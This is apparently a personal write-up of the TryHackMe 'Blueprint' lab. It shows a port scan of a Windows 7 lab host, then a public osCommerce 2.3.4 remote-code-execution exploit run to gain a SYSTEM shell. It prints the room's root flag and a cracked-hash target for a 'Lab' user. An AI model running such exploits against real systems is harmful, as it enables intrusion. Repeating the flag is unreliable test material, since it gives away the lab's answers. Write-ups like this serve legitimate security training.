- - - 
created : 19-07-2025 

Tags : #easy 
- - - 
# Objective

Do you have what is takes to hack into this [Windows](../../3%20-%20Tags/Hacking%20Concepts/Windows.md) Machine?
# Recon

## Rustscan/Nmap

We use [Rustscan](../../3%20-%20Tags/Hacking%20Tools/Rustscan.md) that will pass the result to [Nmap](../../3%20-%20Tags/Hacking%20Tools/Nmap.md) :

```
┌──(mdn0x㉿mdn0xonKali)-[~/THM/CHALLENGES/Easy/Blueprint]
└─$ rustscan -a 10.10.124.215 -- -A 
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: http://discord.skerritt.blog         :
: https://github.com/RustScan/RustScan :
 --------------------------------------
Scanning ports faster than you can say 'SYN ACK'

[~] The config file is expected to be at "/home/mdn0x/.rustscan.toml"
[!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers
[!] Your file limit is very small, which negatively impacts RustScan's speed. Use the Docker image, or up the Ulimit with '--ulimit 5000'. 
Open 10.10.124.215:80
Open 10.10.124.215:135  
Open 10.10.124.215:139
Open 10.10.124.215:445
Open 10.10.124.215:443
Open 10.10.124.215:3306
Open 10.10.124.215:8080

PORT      STATE SERVICE      REASON          VERSION
80/tcp    open  http         syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
| http-methods: 
|   Supported Methods: OPTIONS TRACE GET HEAD POST
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/7.5
|_http-title: 404 - File or directory not found.
135/tcp   open  msrpc        syn-ack ttl 127 Microsoft Windows RPC
139/tcp   open  netbios-ssn  syn-ack ttl 127 Microsoft Windows netbios-ssn
443/tcp   open  ssl/http     syn-ack ttl 127 Apache httpd 2.4.23 (OpenSSL/1.0.2h PHP/5.6.28)
| http-methods: 
|   Supported Methods: OPTIONS GET HEAD POST TRACE
|_  Potentially risky methods: TRACE
| http-ls: Volume /
| SIZE  TIME              FILENAME
| -     2019-04-11 22:52  oscommerce-2.3.4/
| -     2019-04-11 22:52  oscommerce-2.3.4/catalog/
| -     2019-04-11 22:52  oscommerce-2.3.4/docs/
|_
| tls-alpn: 
|_  http/1.1
| ssl-cert: Subject: commonName=localhost
| Issuer: commonName=localhost
| Public Key type: rsa
| Public Key bits: 1024
| Signature Algorithm: sha1WithRSAEncryption
| Not valid before: 2009-11-10T23:48:47
| Not valid after:  2019-11-08T23:48:47
| MD5:   a0a4:4cc9:9e84:b26f:9e63:9f9e:d229:dee0
| SHA-1: b023:8c54:7a90:5bfa:119c:4e8b:acca:eacf:3649:1ff6
| -----BEGIN CERTIFICATE-----
| MIIBnzCCAQgCCQC1x1LJh4G1AzANBgkqhkiG9w0BAQUFADAUMRIwEAYDVQQDEwls
| b2NhbGhvc3QwHhcNMDkxMTEwMjM0ODQ3WhcNMTkxMTA4MjM0ODQ3WjAUMRIwEAYD
| VQQDEwlsb2NhbGhvc3QwgZ8wDQYJKoZIhvcNAQEBBQADgY0AMIGJAoGBAMEl0yfj
| 7K0Ng2pt51+adRAj4pCdoGOVjx1BmljVnGOMW3OGkHnMw9ajibh1vB6UfHxu463o
| J1wLxgxq+Q8y/rPEehAjBCspKNSq+bMvZhD4p8HNYMRrKFfjZzv3ns1IItw46kgT
| gDpAl1cMRzVGPXFimu5TnWMOZ3ooyaQ0/xntAgMBAAEwDQYJKoZIhvcNAQEFBQAD
| gYEAavHzSWz5umhfb/MnBMa5DL2VNzS+9whmmpsDGEG+uR0kM1W2GQIdVHHJTyFd
| aHXzgVJBQcWTwhp84nvHSiQTDBSaT6cQNQpvag/TaED/SEQpm0VqDFwpfFYuufBL
| vVNbLkKxbK2XwUvu0RxoLdBMC/89HqrZ0ppiONuQ+X2MtxE=
|_-----END CERTIFICATE-----
|_http-server-header: Apache/2.4.23 (Win32) OpenSSL/1.0.2h PHP/5.6.28
|_http-title: Index of /
|_ssl-date: TLS randomness does not represent time
445/tcp   open  microsoft-ds syn-ack ttl 127 Windows 7 Home Basic 7601 Service Pack 1 microsoft-ds (workgroup: WORKGROUP)
3306/tcp  open  mysql        syn-ack ttl 127 MariaDB 10.3.23 or earlier (unauthorized)
8080/tcp  open  http         syn-ack ttl 127 Apache httpd 2.4.23 (OpenSSL/1.0.2h PHP/5.6.28)
|_http-server-header: Apache/2.4.23 (Win32) OpenSSL/1.0.2h PHP/5.6.28
| http-ls: Volume /
| SIZE  TIME              FILENAME
| -     2019-04-11 22:52  oscommerce-2.3.4/
| -     2019-04-11 22:52  oscommerce-2.3.4/catalog/
| -     2019-04-11 22:52  oscommerce-2.3.4/docs/
|_
| http-methods: 
|   Supported Methods: OPTIONS GET HEAD POST TRACE
|_  Potentially risky methods: TRACE
|_http-title: Index of /
49152/tcp open  msrpc        syn-ack ttl 127 Microsoft Windows RPC
49153/tcp open  msrpc        syn-ack ttl 127 Microsoft Windows RPC
49154/tcp open  msrpc        syn-ack ttl 127 Microsoft Windows RPC
49158/tcp open  msrpc        syn-ack ttl 127 Microsoft Windows RPC
49159/tcp open  msrpc        syn-ack ttl 127 Microsoft Windows RPC
49160/tcp open  msrpc        syn-ack ttl 127 Microsoft Windows RPC
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running (JUST GUESSING): Microsoft Windows 2008|7|Vista|8.1|2012|10|11|Embedded Compact 7 (96%)
OS CPE: cpe:/o:microsoft:windows_server_2008:r2:sp1 cpe:/o:microsoft:windows_7 cpe:/o:microsoft:windows_vista cpe:/o:microsoft:windows_8.1 cpe:/o:microsoft:windows_server_2012:r2 cpe:/o:microsoft:windows_10 cpe:/o:microsoft:windows_11 cpe:/o:microsoft:windows_embedded_compact_7
OS fingerprint not ideal because: Missing a closed TCP port so results incomplete
Aggressive OS guesses: Microsoft Server 2008 R2 SP1 (96%), Microsoft Windows Vista SP2 or Windows 7 or Windows Server 2008 R2 or Windows 8.1 (96%), Microsoft Windows 7 or 8.1 R1 or Server 2008 R2 SP1 (95%), Microsoft Windows 7 or 8.1 R1 (95%), Microsoft Windows 8.1 (94%), Microsoft Windows 7 or Windows Server 2008 R2 or Windows 8.1 (93%), Microsoft Windows Server 2012 or 2012 R2 (93%), Microsoft Windows 10 (92%), Microsoft Windows 10 1511 - 1607 (92%), Microsoft Windows 10 1607 (92%)
No exact OS matches for host (test conditions non-ideal).
TCP/IP fingerprint:
SCAN(V=7.95%E=4%D=7/19%OT=80%CT=%CU=37143%PV=Y%DS=2%DC=T%G=N%TM=687BCD2E%P=x86_64-pc-linux-gnu)
SEQ(SP=104%GCD=1%ISR=105%TI=I%CI=I%II=I%SS=S%TS=7)
SEQ(SP=106%GCD=1%ISR=109%TI=I%CI=I%II=I%SS=S%TS=7)
OPS(O1=M508NW8ST11%O2=M508NW8ST11%O3=M508NW8NNT11%O4=M508NW8ST11%O5=M508NW8ST11%O6=M508ST11)
WIN(W1=2000%W2=2000%W3=2000%W4=2000%W5=2000%W6=2000)
ECN(R=Y%DF=Y%T=80%W=2000%O=M508NW8NNS%CC=N%Q=)
T1(R=Y%DF=Y%T=80%S=O%A=S+%F=AS%RD=0%Q=)
T2(R=Y%DF=Y%T=80%W=0%S=Z%A=S%F=AR%O=%RD=0%Q=)
T3(R=Y%DF=Y%T=80%W=0%S=Z%A=O%F=AR%O=%RD=0%Q=)
T4(R=Y%DF=Y%T=80%W=0%S=A%A=O%F=R%O=%RD=0%Q=)
T5(R=Y%DF=Y%T=80%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)
T6(R=Y%DF=Y%T=80%W=0%S=A%A=O%F=R%O=%RD=0%Q=)
T7(R=Y%DF=Y%T=80%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)
U1(R=Y%DF=N%T=80%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=Z%RUCK=0%RUD=G)
IE(R=Y%DFI=N%T=80%CD=Z)

Uptime guess: 0.004 days (since Sat Jul 19 18:46:55 2025)
Network Distance: 2 hops
TCP Sequence Prediction: Difficulty=260 (Good luck!)
IP ID Sequence Generation: Incremental
Service Info: Hosts: www.example.com, BLUEPRINT, localhost; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: -20m00s, deviation: 34m37s, median: -1s
| nbstat: NetBIOS name: BLUEPRINT, NetBIOS user: <unknown>, NetBIOS MAC: 02:ae:5a:b3:b5:11 (unknown)
| Names:
|   BLUEPRINT<00>        Flags: <unique><active>
|   WORKGROUP<00>        Flags: <group><active>
|   BLUEPRINT<20>        Flags: <unique><active>
|   WORKGROUP<1e>        Flags: <group><active>
|   WORKGROUP<1d>        Flags: <unique><active>
|   \x01\x02__MSBROWSE__\x02<01>  Flags: <group><active>
| Statistics:
|   02:ae:5a:b3:b5:11:00:00:00:00:00:00:00:00:00:00:00
|   00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00
|_  00:00:00:00:00:00:00:00:00:00:00:00:00:00
| smb2-time: 
|   date: 2025-07-19T16:51:46
|_  start_date: 2025-07-19T16:47:14
| smb-os-discovery: 
|   OS: Windows 7 Home Basic 7601 Service Pack 1 (Windows 7 Home Basic 6.1)
|   OS CPE: cpe:/o:microsoft:windows_7::sp1
|   Computer name: BLUEPRINT
|   NetBIOS computer name: BLUEPRINT\x00
|   Workgroup: WORKGROUP\x00
|_  System time: 2025-07-19T17:51:44+01:00
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode: 
|   2:1:0: 
|_    Message signing enabled but not required
| p2p-conficker: 
|   Checking for Conficker.C or higher...
|   Check 1 (port 28424/tcp): CLEAN (Couldn't connect)
|   Check 2 (port 16313/tcp): CLEAN (Couldn't connect)
|   Check 3 (port 59051/udp): CLEAN (Timeout)
|   Check 4 (port 46864/udp): CLEAN (Failed to receive data)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked

TRACEROUTE (using port 80/tcp)
HOP RTT       ADDRESS
1   96.99 ms  10.8.0.1
2   405.23 ms 10.10.124.215

NSE: Script Post-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 18:51
Completed NSE at 18:51, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 18:51
Completed NSE at 18:51, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 18:51
Completed NSE at 18:51, 0.00s elapsed
Read data files from: /usr/share/nmap
OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 112.14 seconds
           Raw packets sent: 65 (4.612KB) | Rcvd: 62 (3.984KB)

```

So a lot of them are just [Microsoft Remote Procedure Call (MSRPC)](../../3%20-%20Tags/Hacking%20Concepts/Microsoft%20Remote%20Procedure%20Call%20(MSRPC).md) .
# Enumeration

## HTTP (8080)

We can start [Enumeration](../../3%20-%20Tags/Hacking%20Concepts/Enumeration.md) visiting the [Webpage](../../3%20-%20Tags/Hacking%20Concepts/Webpage.md) on 8080, we know it's [Apache](../../3%20-%20Tags/Hacking%20Concepts/Apache.md) 2.4.23 (OpenSSL/1.0.2h PHP/5.6.28) :

![Pasted image 20250719190227.png](../../2%20-%20Resources/Others/Flameshots/Pasted%20image%2020250719190227.png)


![Pasted image 20250719190738.png](../../2%20-%20Resources/Others/Flameshots/Pasted%20image%2020250719190738.png)

OScommerce 2.3.4 

We can download and read the pdf documents .
# Exploit

## Searchsploit

If we search for OScommerce we find and exploit, let's try to use it :

```
osCommerce 2.3.4.1 - Remote Code Execution (2)                                  | php/webapps/50128.py

┌──(mdn0x㉿mdn0xonKali)-[~/THM/CHALLENGES/Easy/Blueprint]
└─$ locate 50128.py
/usr/share/exploitdb/exploits/php/webapps/50128.py

cp /usr/share/exploitdb/exploits/php/webapps/50128.py . 

chmod +x *.py                                          
```

Now let's run the [Python](../../3%20-%20Tags/Programming%20Languages/Python.md) [Exploit](../../3%20-%20Tags/Hacking%20Concepts/Exploit.md) and see what it asks for :

```
──(mdn0x㉿mdn0xonKali)-[~/THM/CHALLENGES/Easy/Blueprint]
└─$ python3 50128.py          
please specify the osCommerce url
format: python3 osCommerce2_3_4RCE.py <url>
eg: python3 osCommerce2_3_4RCE.py http://localhost/oscommerce-2.3.4/catalog

```

Let's do it :

```
┌──(mdn0x㉿mdn0xonKali)-[~/THM/CHALLENGES/Easy/Blueprint]
└─$ python3 50128.py http://10.10.124.215:8080/oscommerce-2.3.4/catalog
[*] Install directory still available, the host likely vulnerable to the exploit.
[*] Testing injecting system command to test vulnerability
User: nt authority\system

RCE_SHELL$ whoami
nt authority\system

```

We have a root [Shell](../../3%20-%20Tags/Hacking%20Concepts/Shell.md) on the system so let's find the root flag :

```
RCE_SHELL$ type C:\Users\Administrator\Desktop\root.txt.txt
THM{aea1e3ce6fe7f89e10cea833ae009bee}
```

We can see the flag directly on the [Website](../../3%20-%20Tags/Hacking%20Concepts/Website.md) too :

![Pasted image 20250719195750.png](../../2%20-%20Resources/Others/Flameshots/Pasted%20image%2020250719195750.png)


We can find 'Lab' user [NTML](../../3%20-%20Tags/Hacking%20Concepts/NTML.md) hash code in SAM file so let's download it and crack the code :

```
## 30e87bf999828446a1c1209ddde4c450
```

googleplus